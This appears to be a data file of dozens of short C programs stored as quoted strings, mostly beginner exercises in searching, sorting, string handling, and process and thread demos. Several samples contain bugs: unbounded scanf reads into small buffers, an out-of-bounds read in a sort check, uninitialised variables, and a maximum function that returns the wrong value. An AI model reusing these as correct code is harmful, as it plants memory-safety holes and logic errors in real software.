    "#include <stdio.h>\nint LinearSearch(int[],int,int);\nint Sorted(int[],int);\nint BinarySearch(int[],int,int);\nint main()\n{\n int choice,key,n,i,A[100];\n printf(\"Enter number of data : \");\n scanf(\"%d\",&n);\n printf(\"Enter data : \");\n for(i=0;i<n;i++)\n  scanf(\"%d\",&A[i]);\n printf(\"\\nSEARCHING\");\n printf(\"\\n1. Linear Search\");\n printf(\"\\n2. Binary Search\");\n printf(\"\\n0. Exit\");\n while(1)\n {\n  printf(\"\\nEnter your choice_\");\n  scanf(\"%d\",&choice);\n  switch(choice)\n  {\n   case 1:\n    printf(\"\\nEnter key :\");\n    scanf(\"%d\",&key);\n    if(LinearSearch(A,n,key))\n     printf(\"\\nData found\");\n    else\n     printf(\"\\nData not found\");\n    break;\n   case 2:\n    if(Sorted(A,n))\n    {\n     printf(\"\\nEnter key :\");\n     scanf(\"%d\",&key);\n     if(BinarySearch(A,n,key))\n      printf(\"\\nData found\");\n     else\n      printf(\"\\nData not found\");\n    }\n    else\n     printf(\"\\nData must be sorted in ascending order\");\n    break;\n   default :\n    return 0;\n  }\n }\n}\nint LinearSearch(int A[],int n,int key)\n{\n int i;\n for(i=0;i<n;i++)\n  if(A[i]==key)\n   return 1;\n return 0;\n}\nint Sorted(int A[],int n)\n{\n int i;\n for(i=1;i<n;i++)\n  if(A[i]>A[i+1])\n   return 0;\n return 1;\n}\nint BinarySearch(int A[],int n,int key)\n{\n int lb,ub,mid;\n lb=0;\n ub=n-1;\n while(lb<ub)\n {\n  mid=(lb+ub)/2;\n  if(A[mid]==key) return 1;\n  else if(key<A[mid]) ub=mid-1;\n  else lb=mid+1;\n }\n if(A[(lb+ub)/2]==key) return 1;\n else return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(){\n int nbr_al;\n srand(time(0)) ;\n nbr_al = rand() % 100 + 1;\n int nbr_entre;\n printf(\"Devinez le nombre : \");\n scanf(\"%d\",&nbr_entre);\n do{\n  if(nbr_entre<nbr_al){\n   printf(\"Plus grand : \");\n   scanf(\"%d\", &nbr_entre);\n   }\n  else{\n   printf(\"Plus petit : \");\n   scanf(\"%d\", &nbr_entre);\n   }\n   }\n  while(nbr_entre!=nbr_al);\n printf(\"Bravo !! vous avez trouv\u00e9 le nombre correspondant qui est %d, EZ \\n\", nbr_al);\n }",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n printf(\"Cross Compile has been succeeded!!\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint input() {\n  int i, count;\n  char u[9];\n  char n[9];\n  char p[9];\n  scanf(\"%d\", &count);\n  if (count < 1) {\n    fprintf((stderr), \"Only strictly positive counts are permitted, exiting...\\n\");\n    exit(1);\n  }\n  for (i = 0; i < count;) {\n    scanf(\"%s %s %s\", n, p, u);\n    printf(\"Student %d %s (%s) is %s\\n\", ++i, u, n, p);\n  }\n  return count;\n}\nint main(int c, char** d) {\n  int count = input();\n  fprintf((stderr), \"%d records processed\\n\", count);\n  return 0;\n}",
    "#include<stdio.h>\nvoid bubble_sort(int a[10],int n)\n{\n    int i,j,temp;\n    for(i=0;i<n-1;i++)\n    {\n        for(j=0;j<n-i-1;j++)\n        {\n            if(a[j]>a[j+1])\n            {\n                temp=a[j];\n                a[j]=a[j+1];\n                a[j+1]=temp;\n            }\n        }\n    }\n}\nint main()\n{\n    int array[10],i,n,data,found=0;\n    printf(\"\\nEnter the size of the array : \");\n    scanf(\"%d\",&n);\n    printf(\"\\nEnter the elements of the array : \\n\");\n    for(i=0;i<n;i++)\n    {\n        printf(\"Enter the element %d : \",i+1);\n        scanf(\"%d\",&array[i]);\n    }\n    printf(\"\\nEnter the data to be search for : \");\n    scanf(\"%d\",&data);\n    for(i=0;i<n;i++)\n    {\n        if(array[i]==data)\n        {\n            printf(\"\\nIn Linear Searching :\\nThe data is found at index : %d \\nNumber of comparisons made : %d\",i,i+1);\n            found=1;\n            break;\n        }\n    }\n    if(found==0)\n    {\n        printf(\"\\nElement not found.....!\");\n        return 0;\n    }\n    bubble_sort(array,n);\n    int beg,end,mid,counter=0;\n    beg=0;\n    end=n-1;\n    mid=(beg+end)/2;\n    while(beg<=end)\n    {\n        if(array[mid]==data)\n        {\n            printf(\"\\nIn Binary searching :\\nData is found at index : %d\\nNumber of comparisons made : %d\",mid,counter);\n            break;\n        }\n        else if(array[mid]>data)\n        {\n            end=mid-1;\n            mid=(beg+end)/2;\n            counter++;\n        }\n        else\n        {\n            beg=mid+1;\n            mid=(beg+end)/2;\n            counter++;\n        }\n    }\n    return 0;\n}",
    "#include <fcntl.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\nint main() {\n int x, y;\n char buf[50];\n x=open(\"f1\", (0x04000000), 00777);\n y=read(x, buf, 20);\n buf[y]=0;\n printf(\"%s\\n\", buf);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"float = %d\\n\", sizeof(float));\n    printf(\"unsigned int = %d\\n\", sizeof(short));\n    printf(\"1.156e32 = %d\\n\", sizeof(1.156e32));\n    printf(\"g = %d\\n\", sizeof(\"g\"));\n    printf(\"\u00a1Hola, mundo! = %d\\n\", sizeof(\"\u00a1Hola, mundo!\"));\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(){\n    char string[100];\n    printf(\"Please enter the string to be checked as palindrome :\\n\");\n    scanf(\"%s\",string);\n    int similar = strlen(string)/2;\n    int j = 0;\n    for(int i = 0; i < similar; i++){\n        if(string[i] == string[strlen(string) - (i + 1)])\n        j++;\n        else\n        ;\n    }\n    if( j == similar)\n    printf(\"%s is a pailndrome string.\\n\", string);\n    else\n    printf(\"%s is NOT a palindrome string.\\n\", string);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[]){\n    float x, avg;\n    float count, sum = 0;\n    printf(\"Input Mathematics marks (0 to terminate):\\n\");\n    while(1){\n        scanf(\"%f\", &x);\n        if (x != 0){\n            sum += x;\n            count++;\n        } else\n            break;\n    }\n    avg = sum/count;\n    printf(\"The average mark is: %.2f\\n\", avg);\n}",
    "#include <stdio.h>\nint cube(int);\nint main(int argc, char const *argv[])\n{\n    puts(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7a0b\u5e8f\u5c06\u8ba1\u7b97\u5b83\u7684\u7acb\u65b9\u3002\");\n    int x;\n    scanf(\"%d\", &x);\n    printf(\"%d\u7684\u7acb\u65b9\u662f\uff1a %d  \\n\", x, cube(x));\n    return 0;\n}\nint cube(int x) {\n    return x * x * x;\n}",
    "#include <stdio.h>\n\nint max;\nchar line[1000];\nchar longest[1000];\nint get_line(void);\nvoid copy(void);\nint main(void)\n{\n    int len;\n    extern int max;\n    extern char longest[];\n    max = 0;\n    while ((len = get_line()) > 0) {\n        if (len > max) {\n            max = len;\n            copy();\n        }\n    }\n    if (max > 0)\n        printf(\"%s\", longest);\n    return (0);\n}\nint get_line(void)\n{\n    int c, i;\n    extern char line[];\n    i = 0;\n    while (((c = getchar()) != (-1)) && (i < 1000 - 1))\n    {\n        line[i++] = c;\n        if (c == '\\n')\n            break;\n    }\n    line[i] = '\\0';\n    return (i);\n}\nvoid copy(void)\n{\n    int i;\n    extern char line[], longest[];\n    i = 0;\n    while ((longest[i] = line[i]) != '\\0')\n        i++;\n    return;\n}",
    "#include <stdio.h>\nint main(void){\n int x=0, z=0, cont=0,contador=1, soma=0;\n scanf(\"%d\", &x);\n while(x>=z){\n  scanf(\"%d\", &z);\n }\n soma=x;\n cont++;\n while(soma<z){\n  int vaca=(x+contador);\n  soma=soma+vaca;\n  cont++;\n  contador++;\n }\n printf(\"%d\\n\", cont);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint procura(int lugar, int tudo[], int tam)\n{\n  int look;\n  for (look = 0; look < tam; look ++)\n  {\n    if (tudo[look] == lugar)\n    {\n      return (look);\n    }\n  }\n}\nint main()\n{\n  int feed; scanf(\"%d\", &feed);\n  int friends; scanf(\"%d\", &friends);\n  float proxim[friends]; int posi, amigo[friends], ler, clean;\n  for (ler = 0; ler < friends; ler ++)\n  {\n    scanf(\"%d\", &posi); scanf(\"%f\", &proxim[ler]);\n    amigo[ler] = posi;\n  }\n  int updates, post[updates]; scanf(\"%d\", &updates);\n  float tempo[updates], auxFloat; char frase[updates][100000], auxWord[100000];\n  for (ler = 0; ler < friends; ler ++)\n  {\n    for (posi = ler; posi < friends; posi ++)\n    {\n      if (amigo[ler] > amigo[posi])\n      {\n        auxFloat = proxim[ler];\n        proxim[ler] = proxim[posi];\n        proxim[posi] = auxFloat;\n        auxFloat = amigo[ler];\n        amigo[ler] = amigo[posi];\n        amigo[posi] = auxFloat;\n      }\n    }\n  }\n  int bug[updates];\n  for (ler = 0; ler < updates; ler ++)\n  {\n    scanf(\"%d\", &posi); scanf(\"%f\", &tempo[ler]);\n    post[ler] = procura(posi, amigo, friends);\n    bug[ler] = posi;\n    getchar(); scanf(\"%[^\\n]\", frase[ler]);\n  }\n  for (ler = 0; ler < updates; ler ++)\n  {\n    for (posi = ler; posi < updates; posi ++)\n    {\n      if ((proxim[post[ler]] * 0.8) + (tempo[ler] * 0.2) < (proxim[post[posi]] * 0.8) + (tempo[posi] * 0.2))\n      {\n        auxFloat = proxim[post[ler]];\n        proxim[post[ler]] = proxim[post[posi]];\n        proxim[post[posi]] = auxFloat;\n        auxFloat = tempo[ler];\n        tempo[ler] = tempo[posi];\n        tempo[posi] = auxFloat;\n        strcpy(auxWord, frase[ler]);\n        strcpy(frase[ler], frase[posi]);\n        strcpy(frase[posi], auxWord);\n        auxFloat = post[ler];\n        post[ler] = post[posi];\n        post[posi] = auxFloat;\n        auxFloat = bug[ler];\n        bug[ler] = bug[posi];\n        bug[posi] = auxFloat;\n      }\n    }\n  }\n  for (ler = 0; ler < feed; ler ++)\n  {\n    printf(\"%d %s\\n\", bug[ler], frase[ler]);\n  }\n  return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n\n\n\nconst char version[] = \"0.0\";\nint main(int argc,char **argv) {\n  off_t maxsize = 4*1024*1024;\n  int counter = 0;\n  char *fmt = \"%s%03d.sql\", *prefix = \"\";\n  int opt, verbose = 0, in_hdr = 0;\n  FILE *fp = ((void*)0);\n  char buffer[4096], fname[1024];\n  while ((opt = getopt(argc,argv,\"h?Vvf:p:s:m:k:\")) != -1) {\n    switch(opt) {\n    case 'h':\n    case '?':\n      fprintf((stderr),\"Usage:\\n\\t%s [-h?] [-v] [-V] [-f fmt] [-s size] [-k kb] [-m mb] [prefix]\\n\",argv[0]);\n      fputs(\"\\t-h|-?:\\tshow help\\n\", (stderr));\n      fputs(\"\\t-v:\\tverbose\\n\", (stderr));\n      fputs(\"\\t-V:\\tprint version info\\n\", (stderr));\n      fprintf((stderr),\"\\t-f fmt:\\tUse format (see printf).  Defaults to \\\"%s\\\"\\n\", fmt);\n      fputs(\"\\t-s bytes:\\tLimit segments to this size in bytes\\n\",(stderr));\n      fputs(\"\\t-k kb:\\tLimit segments to this size in KB\\n\",(stderr));\n      fputs(\"\\t-m mb:\\tLimit segments to this size in MB\\n\",(stderr));\n      exit(0);\n      break;\n    case 'V':\n      printf(\"%s v%s\\n\", argv[0], version);\n      exit(0);\n      break;\n    case 'v':\n      verbose = (!0);\n      break;\n    case 'f':\n      fmt = optarg;\n      break;\n    case 's':\n      maxsize = (off_t)(strtoull(optarg,((void*)0),0));\n      break;\n    case 'm':\n      maxsize = (off_t)(strtoull(optarg,((void*)0),0) * 1024 * 1024);\n      break;\n    case 'k':\n      maxsize = (off_t)(strtoull(optarg,((void*)0),0) * 1024);\n      break;\n    default:\n      fprintf((stderr),\"Usage: %s [options] [prefix]\\n\", argv[0]);\n      exit(1);\n    }\n  }\n  if (optind < argc) prefix = argv[optind];\n  if (verbose) {\n    fprintf((stderr),\"%s: Prefix: %s, Fmt: %s, MaxSize: %llu\\n\", argv[0], prefix, fmt,(long long unsigned int) maxsize);\n  }\n  while ((fgets(buffer,sizeof buffer,(stdin))) != ((void*)0)) {\n    if (buffer[0] == '-' && buffer[1] == '-' && buffer[2]) {\n      if (!in_hdr) {\n if (fp) {\n   fclose(fp);\n   fp = ((void*)0);\n }\n in_hdr = (!0);\n      }\n    } else {\n      in_hdr = 0;\n    }\n    if (!fp) {\n      snprintf(fname, sizeof fname, fmt, prefix, counter++);\n      if (verbose) fprintf((stderr),\"%s: writing %s\\n\", argv[0], fname);\n      fp = fopen(fname,\"w\");\n      if (fp == ((void*)0)) {\n perror(fname);\n exit(1);\n      }\n    }\n    fputs(buffer,fp);\n    if (ftello(fp) > maxsize) {\n      fclose(fp);\n      fp = ((void*)0);\n    }\n  }\n  if (fp) fclose(fp);\n  exit(0);\n}",
    "#include <stdlib.h>\nint foo(int a) {\n    int b;\n    int i;\n    int res = 0;\n    b = rand() % 65536;\n    for (i = 0; i < b; i++)\n        res += a;\n    return res % 65536;\n}\nint main(void) {\n    int a = 0, i;\n    for (i=0; i < 1000; i++) {\n        a += foo(rand() % 65536);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<time.h>\nint main()\n{\n int count,n;\n n = rand() % 100;\n count=1;\n#pragma public_domain_technology check\n {\n start:\n printf(\"num: %4d, Square: %4d, Cube: %4d\\n\",count,(count*count),(count*count*count));\n count++;\n if(count<=n)\n  goto start;\n }\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <pthread.h>\n#include <time.h>\n\n\nint buffer[10] = {0};\nint qtd = 0;\npthread_mutex_t mutex = {{{0}}};\npthread_cond_t cond = {{{0}}};\nvoid printaVetor(){\n int i;\n printf(\"buffer[] = \");\n for(i = 0; i < 10; i++)\n  printf(\"%d \", buffer[i]);\n printf(\"\\n\");\n}\nvoid *Produz(){\n int valor;\n int iterator = 0;\n while(1){\n  pthread_mutex_lock(&mutex);\n  if(qtd == 10)\n   pthread_cond_wait(&cond, &mutex);\n  else{\n   srand(time(((void*)0)));\n   valor = rand() % 51;\n   buffer[iterator] = valor;\n   printf(\"Valor inserido no buffer[%d] = %d\\n\", iterator, buffer[iterator]);\n   iterator = (iterator + 1) % 10;\n   qtd++;\n   printaVetor();\n  }\n  pthread_cond_signal(&cond);\n  pthread_mutex_unlock(&mutex);\n }\n pthread_exit(((void*)0));\n}\nvoid *Consome(){\n int iterator = 0;\n while(1){\n  pthread_mutex_lock(&mutex);\n  if(qtd == 0)\n   pthread_cond_wait(&cond, &mutex);\n  else{\n   printf(\"Valor consumido de buffer[%d] = %d\\n\", iterator, buffer[iterator]);\n   buffer[iterator] = 0;\n   iterator = (iterator + 1) % 10;\n   qtd--;\n   printaVetor();\n  }\n  pthread_cond_signal(&cond);\n  pthread_mutex_unlock(&mutex);\n }\n pthread_exit(((void*)0));\n}\nint main(void){\n pthread_t produtor, consumidor;\n pthread_create(&produtor, ((void*)0), Produz, ((void*)0));\n pthread_create(&consumidor, ((void*)0), Consome, ((void*)0));\n pthread_join(produtor, ((void*)0));\n pthread_join(consumidor, ((void*)0));\n}",
    "#include <stdio.h>\nint main()\n{\n    int numero, i, contador, soma, x;\n    scanf(\"%d\", &numero);\n    i = 1;\n    while (i < numero)\n    {\n        if ((numero % i) == 0)\n        {\n            soma = soma + i;\n        }\n        i = i + 1;\n    }\n    if (soma == numero)\n    {\n        printf(\"sim\");\n    }\n    else\n    {\n        printf(\"nao\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar kTemplate[] = \"<testsuite errors=\\\"0\\\" failures=\\\"0\\\"></testsuite>\";\nint main(int argc, char** argv) {\n  char* buf = malloc(strlen(kTemplate) * sizeof(char) + 1);\n  strcpy(buf, kTemplate);\n  FILE* f = fopen(\"test.results\", \"w\");\n  fprintf(f, \"%s\\n\", buf);\n  fclose(f);\n  printf(\"%d %s\\n\", argc, argv[0]);\n  return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    int x[5], i;\n    double mean = 0.0;\n    for (i = 0; i < 5; i++)\n    {\n        scanf(\"%d\", &x[i]);\n        mean += (double)x[i];\n    }\n    mean /= 5;\n    for (i = 0; i < 5; i++)\n        if((double)x[i] > mean)\n            printf(\"%d\\n\", x[i]);\n    return 0;\n}",
    "#include<stdio.h>\n\nint strcmp(char *s1,char *s2);\nint main()\n{\n  char s1[100],s2[100];\n  int result;\n  printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32s1:\\n\");\n  fgets(s1,100,(stdin));\n  printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32s2:\\n\");\n  fgets(s2,100,(stdin));\n  result = strcmp(s1,s2);\n  if(result > 0)\n  {\n    printf(\"\u5b57\u7b26\u4e32s1\u5927\u4e8es2...\\n\");\n  }else if(result < 0)\n  {\n    printf(\"\u5b57\u7b26\u4e32s1\u5c0f\u4e8es2...\\n\");\n  }else\n  {\n    printf(\"\u5b57\u7b26\u4e32s1\u7b49\u4e8es2...\\n\");\n  }\n  return 0;\n}\nint strcmp(char *s1,char *s2)\n{\n  int result;\n  char *p1 = s1;\n  char *p2 = s2;\n  while(*p1 == *p2 && *p1 != '\\0')\n  {\n    p1++;\n    p2++;\n  }\n  if(*p1 == '\\0' && *p2 == '\\0' )\n  {\n    result = 0;\n  }else\n  {\n    result = *p1 - *p2;\n  }\n  printf(\"result = %d\\n\",result);\n  return result;\n}",
    "#include<stdio.h>\nint main(void){\n  int n, cont;\n  cont=1;\n  printf(\"Digite um n\u00famero: \\n\");\n  scanf(\"%d\", &n);\n  printf(\"%d \", n);\n  for(;n!=1;){\n    if(n%2!=0){\n      n=3*n+1;\n    }else{\n      n=n/2;\n    }\n    printf(\"%d \", n);\n    cont++;\n  }\n  printf(\"\\n\");\n  printf(\"A quantidade de ciclos \u00e9: %d\\n\", cont);\n  return 0;\n}",
    "#include<stdio.h>\nvoid printArray(int arr[], int n)\n{\n    printf(\"The array elements are:\\n\");\n    for(int i=0;i<n;i++)\n    {\n        printf(\"%d \",arr[i]);\n    }\n    printf(\"\\n\");\n}\nvoid bubblesort(int arr[], int n)\n{\n    int temp;\n    for (int i = 0; i < n-1; i++)\n    {\n        printf(\"Working on pass number %d\\n\",i+1);\n        int isSorted=1;\n        for (int j = 0; j < n-1-i; j++)\n        {\n            if(arr[j]>arr[j+1])\n            {\n                temp=arr[j];\n                arr[j]=arr[j+1];\n                arr[j+1]=temp;\n                isSorted=0;\n            }\n        }\n        if(isSorted)\n        {\n            return;\n        }\n    }\n}\nint main()\n{\n    int n;\n    printf(\"Enter the size of array:\\n\");\n    scanf(\"%d\",&n);\n    int arr[n];\n    printf(\"Enter the elements of array:\\n\");\n    for(int i=0;i<n;i++)\n    {\n        scanf(\"%d\",&arr[i]);\n    }\n    printArray(arr,n);\n    bubblesort(arr,n);\n    printArray(arr,n);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main (){\n  char x[100]={};\n  fgets(x, 100, (stdin));\n  FILE *inputFile;\n  FILE *outputFile;\n  inputFile = fopen(\"ae.txt\", \"w\");\n    for (int i = strlen(x) -1 ; i > 0 ; i--) {\n      if (x[i] != 'a' && x[i] != 'e' && x[i] != 'i' && x[i] != 'o' && x[i] != 'u' ) {\n        fprintf(inputFile, \"%c\", x[i]);\n      }\n    }\n  char getWord[100];\n  fclose(inputFile);\n  inputFile = fopen(\"ae.txt\", \"r\");\n  outputFile = fopen(\"aeiot.txt\", \"w\");\n  while (fscanf(inputFile, \"%1023s\", getWord ) == 1) {\n    int ctr = 0;\n    for (int j = 1 ; j <= 100 ; j++){\n      fprintf(outputFile, \"%d%s%s\\n\", j, \": \", getWord );\n    }\n  }\n  printf(\"\\n\");\n fclose(inputFile);\n fclose(outputFile);\n  return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n  int x = 1, y = 2;\n  printf(\"%d\\n\", (x + y));\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n  long long a, b, r, c;\n  long long i, j;\n  int times = 1;\n  while (scanf (\"%lld%lld\", &a, &b) != (-1)) {\n    if (a==0 && b==0) break;\n    r = b * (b-1) / 2;\n    c = a * (a-1) / 2;\n    printf (\"Case %d: %lld\\n\", times++, r*c);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main()\n{\n    char str[20000];\n    while(fgets(str,20000,(stdin))!=((void*)0)){\n        long long int sum=0;\n        char *p=str;\n        while(*p!='\\0'){\n            if(*p!=' '){\n                int temp=0;\n                while(*p!=' ' && *p!='\\n'){\n                    temp=(temp<<3)+(temp<<1)+*p-'0';\n                    ++p;\n                }\n                sum+=temp;\n            }\n            ++p;\n        }\n        printf(\"%lld\\n\",sum);\n    }\n}",
    "#include<stdio.h>\nint main(){\n    int num;\n    printf(\"Enter the number whose multiplication you need: \\n\");\n    scanf(\"%d\", &num);\n    printf(\"Ok! The multiplication of %d is:\\n\", num);\n    for (int i = 1; i <= 10; i++)\n    {\n        printf(\"%d X %d = %d\\n\", num, i, num*(i));\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n printf(\"%d\\n\", 1 + 2);\n return 0;\n}",
    "#include <stdio.h>\nint a = 100;\nint a,b,c = 200;\nint num = 33 ;\nint multiplyFunc(int x, int y);\nint main(){\n    printf(\"Value of a -> %d\\n\", a);\n    printf(\"Value of b -> %d\\n\", b);\n    printf(\"Value of c -> %d\\n\", c);\n    printf(\"Enter a number between 1 and 100:  \");\n    scanf(\"%d\",&a);\n    printf(\"Enter another number:  \");\n    scanf(\"%d\",&b);\n    c=multiplyFunc(a,b);\n    printf(\"c=%d\\n\",c);\n    printf(\"Address of a -> %p\\n\", &a);\n    printf(\"Address of b -> %p\\n\", &b);\n    printf(\"Address of c -> %p\\n\\n\", &c);\n    return 0;\n}\nint multiplyFunc(int x, int y){\n    return(x*y);\n}",
    "#include <stdio.h>\nint main() {\n    unsigned int i1 = 0x01;\n    unsigned int i2 = *(unsigned char *)&i1;\n    if (i1 == i2) {\n        printf(\"LITTLE ENDIAN\\n\");\n    } else {\n        printf(\"BIG ENDIAN\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid showArr(unsigned int *a, int len) {\n    int i;\n    for (i = 0; i != len; i++) {\n        printf(\"%08x \", a[i]);\n    }\n    printf(\"\\n\");\n}\nvoid assign(unsigned int *a, int idx) {\n    a[(idx >> 5) & 3] |= 1 << idx;\n}\nvoid unassign(unsigned int *a, int idx) {\n    if (!(a[(idx >> 5) & 3] & (1 << idx))) {\n        showArr(a, 4);\n        printf(\"except arr on idx=%d\\n\", idx);\n        return;\n    }\n    a[(idx >> 5) & 3] &= ~(1 << idx);\n}\nunsigned int sumBit(unsigned int v) {\n    unsigned int c;\n    for (c = 0; v; c++) {\n        v &= v - 1;\n    }\n    return c;\n}\nunsigned int sumBitArr(unsigned int *a, int len) {\n    unsigned int c;\n    int i;\n    for (i = 0, c = 0; i != len; i++) {\n        c += sumBit(a[i]);\n    }\n    return c;\n}\nint main() {\n    unsigned int a[4] = {0xffffffff};\n    showArr(a, 4);\n    memset(a, 0, sizeof(a));\n    showArr(a, 4);\n    assign(a, 0);\n    assign(a, 1);\n    assign(a, 31);\n    assign(a, 32);\n    assign(a, 63);\n    assign(a, 64);\n    showArr(a, 4);\n    unsigned int c = sumBitArr(a, 4);\n    printf(\"bit: %d\\n\", c);\n    printf(\"len: %lu\\n\", sizeof(a));\n    printf(\"len: %lu\\n\", sizeof(a) / sizeof(a[0]));\n    int idx = 31;\n    printf(\"%08x\\n\", 1 << idx);\n    idx = 32;\n    printf(\"%08x\\n\", 1 << idx);\n    idx = 63;\n    printf(\"%08x\\n\", 1 << idx);\n    idx = 64;\n    printf(\"%08x\\n\", 1 << idx);\n    printf(\"%08x\\n\", 1 << 63);\n    return 0;\n}",
    "#include <stdio.h>\nvoid fibonacci(int posicao_buscada){\n    int i, vetor[posicao_buscada];\n    for(i = 0; i<posicao_buscada; i++){\n        if(i==0) vetor[0] = 0;\n        else if (i==1) vetor[1] = 1;\n        else vetor[i] = vetor[i-1] + vetor[i-2];\n        printf(\"%d\",vetor[i]);\n        if(i != posicao_buscada -1) printf(\" \");\n     }\n     printf(\"\\n\");\n}\nint main()\n {\n    int posicao_buscada;\n    scanf(\"%d\",&posicao_buscada);\n    if( posicao_buscada<=0 ||posicao_buscada>= 46){\n    printf(\"Tente valor entre o intervalo de 0< N <46\");\n    return 0;\n    }\n    fibonacci(posicao_buscada);\n    return 0;\n }",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main()\n{\n    int rnd1, rnd2;\n    double rnd3;\n    srand(123);\n    printf(\"First 3 numbers for seed 123 are: %d, %d, %d\\n\", rand(), rand(), rand());\n    srand(8872);\n    printf(\"First 3 numbers for seed 8872 are: %d, %d, %d\\n\", rand(), rand(), rand());\n    srand(time(((void*)0)));\n    rnd1 = rand() % 21;\n    rnd2 = rand() % 10 - 5;\n    rnd3 = ( (double) rand() ) / (0x7fffffff);\n    printf(\"random number1: %d\\nrandom number2: %d\\nrandom number3: %lf\\n\", rnd1, rnd2, rnd3);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nunsigned char xs[4]={0};\n_Bool mio[32]={0,0,0,0,1,1,1,1,0,0,0,0,1,1,1,1,0,0,0,0,1,1,1,1,0,0,0,0,1,1,1,1};\nvoid bitarrayTo4byte(unsigned char *, _Bool[]);\nvoid bitarrayTo4byte(unsigned char*c, _Bool b[32])\n{\n    int i=0,k=0;\n     for (i=0; i < 8; ++i)\n        if (b[i])\n            c[0] |= 1 << i;\n    for (k=1;k<4;k++)\n     for (i=8*k; i < 8*(k+1); ++i)\n        if (b[i])\n            c[k] |= 1 << i%(8*k);\n}\nint main(void){\n    printf(\"%d %d %d %d \\t\",xs[3],xs[2],xs[1],xs[0]);\n    bitarrayTo4byte(&xs[0],mio);\n    printf(\"%d %d %d %d\",xs[3],xs[2],xs[1],xs[0]);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(void){\n    int i = 1;\n    switch(fork()){\n        case -1 :\n            perror(\"Error al crear el proceso\");\n            exit(-1);\n            break;\n        case 0 :\n            while (i<=10){\n                sleep (1);\n                printf(\"\\t Soy el proceso hijo: %d\\n\", i++);\n            }\n            break;\n        default :\n            while (i<=10){\n                printf(\"Soy el proceso padre: %d\\n\", i++);\n                sleep(2);\n            }\n    }\n    return(0);\n}",
    "#include <stdio.h>\nint main(void)\n{\n int hour, minute;\n printf(\"Enter a 24-hour time (hh:mm): \");\n (void)scanf(\"%d :%d\", &hour, &minute);\n printf(\"Equivalent 12-hour time: \");\n if (hour < 12) {\n  if (hour == 0)\n   printf(\"12\");\n  else\n   printf(\"%d\", hour);\n  printf(\":%.2d AM\\n\", minute);\n } else {\n  if (hour == 12)\n   printf(\"12\");\n  else\n   printf(\"%d\", hour - 12);\n  printf(\":%.2d PM\\n\", minute);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int num1, num2, sum;\n    num1 = 3;\n    num2 = 4;\n    sum = num1 - num2;\n    system(\"COLOR 0B\");\n    printf(\"HACKED\");\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n int a;\n scanf(\"%d\",&a);\n int arr[a];\n float count = 0;\n float cou=0;\n float num=0;\n for (int i = 0; i < a; ++i)\n {\n  scanf(\"%d\",&arr[i]);\n  if (arr[i] > 0)\n  {\n   count=count +1;\n  }\n  else if(arr[i] == 0)\n  {\n   cou=cou+1;\n  }\n  else if(arr[i] < 0)\n  {\n   num=num+1;\n  }\n }\n printf(\"%f\\n\",count/a );\n printf(\"%f\\n\",num/a );\n printf(\"%f\\n\",cou/a );\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    float n,square,cube;\n    printf(\"Enter the value\");\n    scanf(\"%f\",&n);\n    square=n*n;\n    cube=n*n*n;\n    printf(\"The Square and cube of %f is %f and %f\",n,square,cube);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n    char str1[101];\n    char str2[101] = \"hello\";\n    scanf(\"%s\", &str1);\n    int i, j = 0, count = 0;\n    int len = strlen(str1);\n    for (i = 0; i < len; i++)\n    {\n        if (str1[i] == str2[j])\n        {\n            j++;\n            count++;\n        }\n    }\n    if (count == 5)\n    {\n        printf(\"YES\\n\");\n    }\n    else\n    {\n        printf(\"NO\\n\");\n    }\n}",
    "#include <stdio.h>\nint maximum(int, int, int);\nint main(void)\n{\n int a, b, c;\n scanf(\"%d%d%d\", &a, &b, &c);\n printf(\"Greather: %d\\n\", maximum(a, b, c));\n return 0;\n}\nint maximum(int x, int y, int z)\n{\n int max = x;\n if (y > max)\n  max = y;\n if (z > max)\n  max = z;\n return z;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nchar *reversed(char *str);\nint main(void)\n{\n char original[21] = \"Hello world!\";\n char * changed;\n changed = reversed(original);\n puts(changed);\n return 0;\n}\nchar *reversed(char *str)\n{\n int i = 0;\n int j = strlen(str) - 1;\n char tmp;\n while (i < j)\n {\n  tmp = str[i];\n  str[i] = str[j];\n  str[j] = tmp;\n  i++;\n  j--;\n }\n return str;\n}",
